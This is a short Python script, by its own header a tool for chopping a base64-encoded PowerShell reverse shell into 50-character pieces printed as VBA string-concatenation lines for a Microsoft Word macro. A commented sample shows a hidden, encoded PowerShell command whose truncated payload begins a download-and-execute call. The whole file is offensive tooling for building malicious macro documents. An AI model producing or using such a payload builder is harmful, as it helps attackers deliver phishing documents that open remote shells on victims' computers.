# python script to split powershell base64 reverse shell into max line length for microsoft word macros

import sys
str = sys.argv[1]
#str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
